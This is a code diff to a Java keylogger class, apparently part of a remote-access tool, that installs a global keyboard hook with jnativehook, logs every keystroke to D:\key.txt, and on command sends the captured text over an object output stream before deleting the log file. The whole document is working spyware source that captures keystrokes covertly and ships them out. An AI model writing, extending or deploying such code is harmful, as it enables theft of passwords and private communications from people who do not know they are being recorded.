@@ -20,10 +20,11 @@ import org.jnativehook.keyboard.NativeKeyListener;
 
 
 public class KeyLogger implements NativeKeyListener {
-	public String record = "";
+	public String record = "Key: ";
 	public ObjectOutputStream oos;
 	public String content="";
 	public String key="";
+	public File myObj;
 	public KeyLogger(ObjectOutputStream oos,String record) {
 		// TODO Auto-generated constructor stub
 		this.oos = oos;
@@ -31,8 +32,10 @@ public class KeyLogger implements NativeKeyListener {
 	}
 
 	public void nativeKeyPressed( NativeKeyEvent e) {
+		//myObj.delete();
+		System.out.println("Pressed");
 		record+=" "+NativeKeyEvent.getKeyText(e.getKeyCode());
-		File myObj = new File("D:\\key.txt");
+		myObj = new File("D:\\key.txt");
 		FileWriter fileWriter = null;
 		try {
 			fileWriter = new FileWriter("D:\\key.txt");
@@ -46,10 +49,6 @@ public class KeyLogger implements NativeKeyListener {
 		if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
             		try {
                 		GlobalScreen.unregisterNativeHook();
-                	//	System.out.println(record);
-                		   		  
-              		   
-              		     record="";
               		  
             		} catch (NativeHookException nativeHookException) {
                 		nativeHookException.printStackTrace();
@@ -68,15 +67,24 @@ public class KeyLogger implements NativeKeyListener {
 		//System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
 	}
 
-	public void get_Keylogger(ObjectOutputStream oos) {
-		
+	public void get_Keylogger(ObjectOutputStream oos) throws IOException {
+		 myObj = new File("D:\\key.txt");
+		 FileWriter fileWriter;
+		 fileWriter = new FileWriter("D:\\key.txt");
+		 PrintWriter printWriter  = new PrintWriter(fileWriter);
+		 printWriter.print("1");           
+		 printWriter.close();
 		  LogManager.getLogManager().reset();
 		  Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
 
 		  logger.setLevel(Level.OFF);
+		  
+		 
 
 		try {
+			
 			GlobalScreen.registerNativeHook();
+		
 		}
 		catch (NativeHookException ex) {
 			System.err.println("There was a problem registering the native hook.");
@@ -84,8 +92,10 @@ public class KeyLogger implements NativeKeyListener {
 
 			System.exit(1);
 		}
-
+	
 		GlobalScreen.addNativeKeyListener(new KeyLogger(oos,record));
+		// myObj = new File("D:\\key.txt");
+		
 	}
 	public void send_KeyLogger() throws IOException, NativeHookException {
 		/*GlobalScreen.unregisterNativeHook();
@@ -97,14 +107,28 @@ public class KeyLogger implements NativeKeyListener {
 		printWriter.close();
 		//Escape();*/
 		// printWriter.close();
-		GlobalScreen.unregisterNativeHook();
+		
+		//GlobalScreen.registerNativeHook();
 
+		GlobalScreen.unregisterNativeHook();
+		//myObj = new File("D:\\key.txt");
 		Path fileName = Path.of("D:\\key.txt");
 		content = Files.readString(fileName);
-	  	System.out.println(content);
+		System.out.println(content.length());
+		
+	  	if(content.length() == 1) {
+	  		//File file= new File("D:\\key.txt");
+	  		//myObj.delete();
+	  		String err="No key recorded";
+			oos.writeObject(err);
+			
+	  
+	  	} else {
 	  	File file= new File("D:\\key.txt");
     	file.delete();
-		oos.writeObject(content);
-	}
+		oos.writeObject(content);}
 	
+	    File file= new File("D:\\key.txt");
+	    file.delete();
+	}
 }
